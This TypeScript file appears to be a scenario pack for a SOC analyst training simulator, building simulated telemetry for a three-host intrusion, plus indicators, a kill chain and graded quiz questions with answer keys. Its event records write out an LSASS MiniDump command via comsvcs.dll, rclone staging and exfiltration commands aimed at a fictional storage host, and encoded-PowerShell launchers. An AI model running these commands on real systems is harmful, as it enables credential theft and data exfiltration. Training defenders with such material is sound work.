/**
 * Scenario pack: "Multi-Host Intrusion — Foothold, Lateral Move, Staging"
 *
 * ADVANCED tier. A single hands-on-keyboard operator moves across THREE Windows
 * hosts in one evening, on the way to a ransomware deployment that a night-shift
 * analyst interrupts. It is deliberately a MULTI-INCIDENT scenario: each host is
 * its own EDR incident (its own isolated case in the console's Incidents page),
 * and the three are correlated into one campaign by a shared operator, a shared
 * C2 domain, and a tight timeline.
 *
 *   Incident 1 (FIN-WS-08)  — Initial access: a macro-enabled invoice spawns an
 *                             encoded-PowerShell Cobalt Strike beacon. edr.
 *   Incident 2 (FS-SRV-03)  — Lateral move + credential access: PsExec landing,
 *                             then an LSASS MiniDump. hybrid (host + AD logon).
 *   Incident 3 (BKP-SRV-02) — Collection + exfil: a renamed rclone stages the
 *                             finance shares and pushes them out. edr.
 *
 * The learning point is scoping a campaign across hosts: the same operator, the
 * same infrastructure, three separate endpoints — investigated as three EDR cases
 * that a good analyst ties together.
 *
 * SOURCES: edr (CrowdStrike Falcon), firewall (Palo Alto NGFW), ad (Windows
 * Security / Domain Controller).
 *
 * NOTE: register in scenarios.ts with difficulty "advanced".
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { panWeb, panConnection } from "@/lib/sim/emitters/paloalto";
import { csProcess, csProcessAccess, csNetwork, csAlert } from "@/lib/sim/emitters/crowdstrike";
import { winLogon } from "@/lib/sim/emitters/windowsSecurity";

export function buildMultiHostIntrusionScenario(
  scenarioId = "multi-host-intrusion-2026",
): ScenarioBundle {
  const B = new Date("2026-08-19T18:40:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // One campaign, three host incidents — each its own isolated EDR case.
  const INC_WS = "inc:mhi:ws";    // FIN-WS-08 — initial access
  const INC_FS = "inc:mhi:fs";    // FS-SRV-03 — lateral + credential access
  const INC_BK = "inc:mhi:bkp";   // BKP-SRV-02 — collection + exfil

  const ws  = { hostname: "FIN-WS-08",  ip: "10.20.6.28" };
  const fs  = { hostname: "FS-SRV-03",  ip: "10.20.7.33" };
  const bkp = { hostname: "BKP-SRV-02", ip: "10.20.7.52" };
  const victim = { email: "n.harel@nexacorp.com", sam: "n.harel" };
  const svc = { sam: "svc_backup" };

  const c2 = "cdn-sync-eu.net";
  const c2ip = "45.137.101.22";
  const exfilHost = "store.filedrop-transfer.net";
  const exfilIp = "185.199.53.14";
  const sensorId = "a71c9e0d34b8425fa2c6e5710bd8493f";

  const macroDocHash = makeSha256("multihost_invoice_q3_macro_docm_2026");
  const beaconHash   = makeSha256("multihost_cobalt_beacon_dll_2026");
  const psexecHash   = makeSha256("multihost_psexesvc_service_2026");
  const rcloneHash   = makeSha256("multihost_renamed_rclone_svchost_update_2026");

  const cxN = "nexacorp" as const;

  const events: TelemetryEvent[] = [
    // ═══════════ INCIDENT 1 — FIN-WS-08 (initial access) ═══════════
    // 1. The macro invoice is downloaded from a lookalike supplier portal.
    panWeb({
      companyId: cxN, id: "evt_mhi_ws1_download", ts: T(0), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      userTitle: "Accounts Payable Clerk", incidentId: INC_WS, severity: "low",
      url: "https://supplier-invoices-nexa.com/inv/Invoice_Q3_4471.docm", domain: "supplier-invoices-nexa.com",
      category: "business-and-economy", action: "alert", dstIp: "104.21.9.11", bytesIn: 88_320,
      file: { name: "Invoice_Q3_4471.docm", path: "/inv/Invoice_Q3_4471.docm", sha256: macroDocHash }, fileType: "ms-office",
      description: "FIN-WS-08 downloaded Invoice_Q3_4471.docm from a lookalike supplier portal at 18:40, allowed under the category business-and-economy.",
    }),
    // 2. The enabled macro spawns cmd.exe under WINWORD.EXE.
    csProcess({
      companyId: cxN, id: "evt_mhi_ws2_macro_spawn", ts: T(3 * MIN), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe",
      cmdline: "cmd.exe /c powershell -nop -w hidden -enc SQBFAF...", parentName: "WINWORD.EXE", parentPid: 5044, pid: 6112,
      mitre: "T1059.003", tactic: "Execution", severity: "high", incidentId: INC_WS,
      description: "WINWORD.EXE spawned cmd.exe at 18:43 after the invoice macro was enabled.",
    }),
    // 3. THE FOOTHOLD CRUX — encoded PowerShell injects a Cobalt Strike beacon.
    csProcess({
      companyId: cxN, id: "evt_mhi_ws3_beacon", ts: T(3 * MIN + 8 * SEC), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A", parentName: "cmd.exe", parentPid: 6112, pid: 6180,
      sha256: beaconHash, signed: true, isDetection: true, mitre: "T1059.001", tactic: "Execution", severity: "critical", incidentId: INC_WS,
      description: "cmd.exe launched an encoded PowerShell that decoded and injected a Cobalt Strike beacon into memory.",
    }),
    // 4. The beacon heartbeat — a repeating TLS session to the C2 (SSL, not decrypted).
    panConnection({
      companyId: cxN, id: "evt_mhi_ws4_c2", ts: T(4 * MIN), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      app: "ssl", domain: c2, dstIp: c2ip, url: `${c2}/api/v2/heartbeat`, category: "unknown", action: "allow",
      bytesOut: 512, bytesIn: 128, repeatCount: 14, mitre: "T1071.001", tactic: "Command and Control", severity: "high", incidentId: INC_WS,
      description: "FIN-WS-08 began beaconing to cdn-sync-eu.net every 60s with a fixed jitter — a Cobalt Strike malleable C2 profile.",
    }),
    // 5. The Falcon detection that opened incident 1.
    {
      ...csAlert({
        companyId: cxN, id: "evt_mhi_ws5_alert", ts: T(5 * MIN), host: ws.hostname, srcIp: ws.ip, user: victim.email,
        threatName: "EncodedPowerShellBeaconUnderOffice", severity: "critical", mitre: "T1059.001", tactic: "Execution",
        technique: "Command and Scripting Interpreter: PowerShell", processTree: "WINWORD.EXE > cmd.exe > powershell.exe",
        action: "detected", incidentId: INC_WS,
        description: "Falcon raised a Critical detection on FIN-WS-08: encoded PowerShell decoded an in-memory beacon under WINWORD.EXE, with a repeating TLS heartbeat to external infrastructure.",
      }),
      edr_scope: "edr",
    },

    // ═══════════ INCIDENT 2 — FS-SRV-03 (lateral + credential access) ═══════════
    // 6. The foothold reaches the file server — a Type-3 NTLM logon from FIN-WS-08.
    winLogon({
      companyId: cxN, id: "evt_mhi_fs1_logon", ts: T(19 * MIN), host: fs.hostname, fqdn: fs.hostname, srcIp: ws.ip,
      targetUser: victim.sam, userEmail: victim.email, logonType: 3, authPackage: "NTLM", workstation: ws.hostname,
      severity: "medium", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_FS,
      description: "A Type 3 network logon for n.harel arrived on FS-SRV-03 from FIN-WS-08 at 18:59 — the foothold host reaching the file server over SMB.",
    }),
    // 7. A PsExec landing — services.exe → PSEXESVC.exe → cmd.exe.
    csProcess({
      companyId: cxN, id: "evt_mhi_fs2_psexec", ts: T(19 * MIN + 40 * SEC), host: fs.hostname, srcIp: fs.ip, user: victim.email,
      processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: "cmd.exe /c C:\\Windows\\Temp\\d.bat",
      parentName: "PSEXESVC.exe", parentPid: 4188, pid: 4210, sha256: psexecHash, mitre: "T1021.002", tactic: "Lateral Movement",
      severity: "high", incidentId: INC_FS,
      description: "services.exe started PSEXESVC.exe on FS-SRV-03, which spawned cmd.exe — a PsExec remote-execution landing.",
    }),
    // 8. THE CREDENTIAL-THEFT CRUX — rundll32 comsvcs MiniDump against lsass with full access.
    csProcessAccess({
      companyId: cxN, id: "evt_mhi_fs3_lsass", ts: T(20 * MIN + 30 * SEC), host: fs.hostname, srcIp: fs.ip, user: victim.email,
      processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe",
      cmdline: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 712 C:\\Windows\\Temp\\lsass.dmp full",
      parentName: "cmd.exe", parentPid: 4210, pid: 4360, targetProcess: "lsass.exe", targetPid: 712, grantedAccess: "0x1FFFFF",
      simpleName: "ProcessAccessIOC", threatName: "LsassMiniDumpViaComsvcs", mitre: "T1003.001", tactic: "Credential Access",
      technique: "OS Credential Dumping: LSASS Memory", severity: "critical", isDetection: true, incidentId: INC_FS,
      description: "rundll32.exe called comsvcs.dll MiniDump against lsass.exe with full access, writing C:\\Windows\\Temp\\lsass.dmp.",
    }),
    // 9. The Falcon detection that opened incident 2.
    {
      ...csAlert({
        companyId: cxN, id: "evt_mhi_fs4_alert", ts: T(21 * MIN), host: fs.hostname, srcIp: fs.ip, user: victim.email,
        threatName: "LsassMiniDumpViaComsvcs", severity: "critical", mitre: "T1003.001", tactic: "Credential Access",
        technique: "OS Credential Dumping: LSASS Memory", processTree: "services.exe > PSEXESVC.exe > cmd.exe > rundll32.exe",
        action: "detected", incidentId: INC_FS,
        description: "Falcon raised a Critical detection on FS-SRV-03: LSASS memory was dumped via comsvcs.dll MiniDump by a PsExec-launched shell, moments after a network logon from FIN-WS-08.",
      }),
      edr_scope: "hybrid",
    },

    // ═══════════ INCIDENT 3 — BKP-SRV-02 (collection + exfil) ═══════════
    // 10. THE COLLECTION CRUX — a renamed rclone stages the finance share.
    csProcess({
      companyId: cxN, id: "evt_mhi_bk1_stage", ts: T(34 * MIN), host: bkp.hostname, srcIp: bkp.ip, user: svc.sam,
      processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
      cmdline: "svchost-update.exe copy \\\\FS-SRV-03\\Finance R:\\stage --transfers 16", parentName: "cmd.exe", parentPid: 7602, pid: 7720,
      sha256: rcloneHash, signed: false, originalFileName: "rclone.exe", mitre: "T1560.001", tactic: "Collection", severity: "high", incidentId: INC_BK,
      description: "svchost-update.exe — an unsigned binary in ProgramData — began recursively archiving \\\\FS-SRV-03\\Finance into 200 MB .r00 volumes on BKP-SRV-02.",
    }),
    // 11. THE EXFIL CRUX — the renamed rclone pushes the staged archive to cloud storage.
    csNetwork({
      companyId: cxN, id: "evt_mhi_bk2_exfil_proc", ts: T(41 * MIN), host: bkp.hostname, srcIp: bkp.ip, user: svc.sam,
      remoteIp: exfilIp, remotePort: 443, application: "tls", domain: exfilHost,
      processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
      cmdline: "svchost-update.exe copy R:\\stage remote:backup --transfers 16", pid: 7720, parentName: "cmd.exe", parentPid: 7602,
      sha256: rcloneHash, bytesOut: 3_650_722_000, isDetection: true, mitre: "T1567.002", tactic: "Exfiltration", severity: "critical", incidentId: INC_BK,
      description: "svchost-update.exe opened a sustained TLS session to store.filedrop-transfer.net and transferred the staged R:\\stage volumes — 3.4 GB outbound over 9 minutes.",
    }),
    // 12. The firewall's view of the same upload — a large TLS session to an online-storage host.
    panConnection({
      companyId: cxN, id: "evt_mhi_bk3_fw", ts: T(41 * MIN + 30 * SEC), host: bkp.hostname, srcIp: bkp.ip, user: null,
      app: "ssl", domain: exfilHost, dstIp: exfilIp, url: `${exfilHost}/upload`, category: "online-storage-and-backup",
      action: "allow", bytesOut: 3_650_722_000, mitre: "T1567.002", tactic: "Exfiltration", severity: "high", incidentId: INC_BK,
      description: "The firewall recorded 3.4 GB of TLS upload from BKP-SRV-02 to store.filedrop-transfer.net, category online-storage-and-backup, allowed.",
    }),
    // 13. The Falcon detection that opened incident 3.
    {
      ...csAlert({
        companyId: cxN, id: "evt_mhi_bk4_alert", ts: T(43 * MIN), host: bkp.hostname, srcIp: bkp.ip, user: svc.sam,
        threatName: "MassStagingAndCloudExfil", severity: "critical", mitre: "T1567.002", tactic: "Exfiltration",
        technique: "Exfiltration to Cloud Storage", processTree: "cmd.exe > svchost-update.exe", action: "detected", incidentId: INC_BK,
        description: "Falcon raised a Critical detection on BKP-SRV-02: an unsigned rclone-derived binary archived a file share and transferred multiple gigabytes to an online-storage host.",
      }),
      edr_scope: "edr",
    },
  ];

  const iocs: IOC[] = [
    { type: "domain", value: c2, first_seen: T(4 * MIN), last_seen: T(4 * MIN), reputation: "malicious", tags: ["c2", "cobalt-strike"] },
    { type: "domain", value: exfilHost, first_seen: T(41 * MIN), last_seen: T(41 * MIN), reputation: "malicious", tags: ["exfil", "cloud-storage"] },
    { type: "sha256", value: beaconHash, first_seen: T(3 * MIN + 8 * SEC), last_seen: T(5 * MIN), reputation: "malicious", tags: ["cobalt-strike", "beacon"] },
    { type: "sha256", value: rcloneHash, first_seen: T(34 * MIN), last_seen: T(43 * MIN), reputation: "malicious", tags: ["rclone", "exfil", "renamed"] },
    { type: "ip", value: c2ip, first_seen: T(4 * MIN), last_seen: T(4 * MIN), reputation: "malicious", tags: ["c2"] },
    { type: "host", value: ws.hostname, first_seen: T(0), last_seen: T(5 * MIN), reputation: "unknown", tags: ["patient-zero", "affected"] },
    { type: "host", value: fs.hostname, first_seen: T(19 * MIN), last_seen: T(21 * MIN), reputation: "unknown", tags: ["lateral", "affected"] },
    { type: "host", value: bkp.hostname, first_seen: T(34 * MIN), last_seen: T(43 * MIN), reputation: "unknown", tags: ["exfil", "affected"] },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt: "Three Falcon detections fired on three different hosts within 40 minutes. What is the strongest evidence they are one campaign rather than three unrelated events?",
      hint: "Follow the account, the timing, and the infrastructure across the three incidents.",
      kind: "single",
      options: [
        { value: "chain", label: "The same account (n.harel) moves FIN-WS-08 → FS-SRV-03 by network logon minutes after the foothold, and the staged data on BKP-SRV-02 comes from FS-SRV-03 — a single actor chaining hosts on one timeline" },
        { value: "same_sev", label: "All three detections are Critical severity, which means they must belong to the same incident" },
        { value: "same_edr", label: "All three came from CrowdStrike Falcon, so they are automatically correlated into one case" },
        { value: "coincidence", label: "Three separate commodity infections happened to land on the same evening" },
      ],
      answer: "chain",
      xp: 60,
      explanation:
        "Correlation across hosts is built from shared entities and a coherent timeline, not from a shared severity or a shared tool. Here n.harel's foothold on FIN-WS-08 (18:43) is followed by a Type-3 logon as n.harel onto FS-SRV-03 from FIN-WS-08 (18:59), an LSASS dump there, and then staging on BKP-SRV-02 that reads \\\\FS-SRV-03\\Finance — each step feeds the next. Same severity (b) and same vendor (c) are true but prove nothing about causation. (d) ignores the account and data flow that tie the hosts together.",
    },
    {
      id: "q2",
      prompt: "You open the EDR console and see three separate incidents. For FS-SRV-03, which single event is the credential-theft that expands the blast radius beyond one workstation?",
      kind: "single",
      options: [
        { value: "lsass", label: "evt_mhi_fs3_lsass — rundll32.exe calling comsvcs.dll MiniDump against lsass.exe with GrantedAccess 0x1FFFFF" },
        { value: "psexec", label: "evt_mhi_fs2_psexec — the PsExec landing that ran cmd.exe" },
        { value: "logon", label: "evt_mhi_fs1_logon — the Type 3 network logon from FIN-WS-08" },
        { value: "alert", label: "evt_mhi_fs4_alert — the Falcon summary detection" },
      ],
      answer: "lsass",
      xp: 50,
      explanation:
        "The MiniDump of LSASS (T1003.001) is what hands the operator every credential cached on FS-SRV-03 — including any privileged or service accounts logged on there — which is exactly how a single-host foothold becomes a domain-wide problem. The PsExec landing (b) is how the operator arrived, the network logon (c) is the lateral step, and the summary alert (d) names the technique but is the vendor's roll-up, not the act itself. GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) against lsass.exe is the tell.",
    },
    {
      id: "q3",
      prompt: "svchost-update.exe on BKP-SRV-02 is unsigned, sits in C:\\ProgramData\\Adobe, and its process metadata shows original_file_name rclone.exe. What does that combination tell you?",
      kind: "single",
      options: [
        { value: "renamed_rclone", label: "It is rclone renamed to blend in — a legitimate sync tool repurposed as an exfiltration utility, confirmed by the original-file-name mismatch" },
        { value: "adobe", label: "It is a genuine Adobe updater that Falcon misclassified" },
        { value: "svchost", label: "It is the real Windows svchost.exe running from an unusual path" },
        { value: "unknown", label: "Nothing can be concluded without submitting the hash to VirusTotal" },
      ],
      answer: "renamed_rclone",
      xp: 50,
      explanation:
        "The PE's embedded original file name is rclone.exe while the on-disk name is svchost-update.exe — a deliberate rename to look like a Windows/Adobe background task. rclone is a legitimate cloud-sync utility that operators routinely abuse for exfiltration (T1567.002); the unsigned status, the ProgramData\\Adobe path, and the 3.4 GB PUT to an online-storage host complete the picture. (b) and (c) are the disguises the naming is meant to sell; (d) is good practice but the metadata already answers the question here.",
    },
    {
      id: "q4",
      prompt: "You are containing this campaign across all three hosts. Which action set matches the evidence?",
      kind: "single",
      options: [
        { value: "all", label: "Network-contain all three hosts, reset n.harel and every account exposed in the LSASS dump, block the C2 and exfil domains, and treat the finance share data as exfiltrated" },
        { value: "ws_only", label: "Isolate FIN-WS-08 only — it is patient zero, so containing it stops the rest" },
        { value: "block_dns", label: "Block cdn-sync-eu.net and store.filedrop-transfer.net at the firewall; the endpoints are fine once C2 is cut" },
        { value: "reimage", label: "Reimage BKP-SRV-02 to remove the exfil tool; the other hosts had no data loss" },
      ],
      answer: "all",
      xp: 60,
      explanation:
        "By the time you are looking, the operator holds credentials from FS-SRV-03 and has already moved to a third host and pushed data out — so containment has to cover all three hosts at once, invalidate the stolen credentials (a password reset does nothing about a dumped NTLM hash still usable for pass-the-hash, so reset AND monitor/rotate service accounts), and assume the finance share left the building. (b) is false because the operator already pivoted off patient zero using stolen creds. (c) cuts C2 but leaves live credentials and on-host tooling. (d) ignores the credential theft and the foothold on the other two hosts.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Multi-Host Intrusion — Foothold, Lateral Move, Staging",
    threat_actor: "Hands-on-keyboard intrusion operator (pre-ransomware)",
    attack_kind: "multi_host_intrusion",
    briefing:
      "Three CrowdStrike Falcon detections fired on three different hosts — FIN-WS-08, FS-SRV-03 and BKP-SRV-02 — inside 40 minutes tonight. Each opened as its own incident. Work out whether they are one campaign, what the operator took, and how far it spread before you contain it.",
    narrative: `At 18:40 Noa Harel in Accounts Payable opened Invoice_Q3_4471.docm from a lookalike supplier portal and enabled the macro. WINWORD.EXE spawned cmd.exe, which ran an encoded PowerShell that injected a Cobalt Strike beacon; from 18:44 FIN-WS-08 was beaconing to cdn-sync-eu.net. That is incident one.

Fifteen minutes later the operator used Noa's session to reach the file server. A Type-3 logon for n.harel arrived on FS-SRV-03 from FIN-WS-08 at 18:59, PsExec dropped PSEXESVC.exe and a shell, and at 19:00 rundll32.exe called comsvcs.dll MiniDump against lsass.exe with full access, writing lsass.dmp. That is incident two — and it is where a single-workstation problem became a credential problem.

At 19:14 an unsigned binary named svchost-update.exe, living in C:\\ProgramData\\Adobe with an embedded original file name of rclone.exe, began archiving \\\\FS-SRV-03\\Finance on BKP-SRV-02. By 19:21 it had pushed 3.4 GB to store.filedrop-transfer.net. That is incident three.

Falcon raised all three as separate Critical detections. Nothing was contained. The night-shift analyst catches the third alert at 19:23 — before the ransomware stage, but after the data has left.`,
    learning_objectives: [
      "Correlate detections across multiple hosts into a single campaign using shared accounts, timeline, and infrastructure — not shared severity or vendor",
      "Investigate each host as its own EDR incident (its own isolated case) while keeping the campaign view",
      "Recognise LSASS MiniDump via comsvcs.dll (T1003.001) as the step that turns a foothold into a credential-theft blast radius",
      "Identify a renamed legitimate tool (rclone → svchost-update.exe) from an original-file-name mismatch and unsigned status",
      "Scope containment for a multi-host, credential-theft, exfil-complete intrusion — isolate all hosts, invalidate credentials, assume data loss",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: T(3 * MIN), phase: "Initial Access", action: "Macro invoice on FIN-WS-08 spawns cmd → encoded PowerShell (T1204.002 / T1059.003)" },
      { ts: T(3 * MIN + 8 * SEC), phase: "Execution", action: "Cobalt Strike beacon injected in memory (T1059.001)" },
      { ts: T(4 * MIN), phase: "C2", action: `Beacon to ${c2} (T1071.001)` },
      { ts: T(19 * MIN), phase: "Lateral Movement", action: "Type-3 logon FIN-WS-08 → FS-SRV-03; PsExec landing (T1021.002)" },
      { ts: T(20 * MIN + 30 * SEC), phase: "Credential Access", action: "LSASS MiniDump via comsvcs.dll on FS-SRV-03 (T1003.001)" },
      { ts: T(34 * MIN), phase: "Collection", action: "Renamed rclone stages \\\\FS-SRV-03\\Finance on BKP-SRV-02 (T1560.001)" },
      { ts: T(41 * MIN), phase: "Exfiltration", action: `3.4 GB pushed to ${exfilHost} (T1567.002)` },
      { ts: T(43 * MIN), phase: "Detection", action: "Third Falcon detection — analyst intervenes before ransomware" },
    ],
    questions,
  };
}
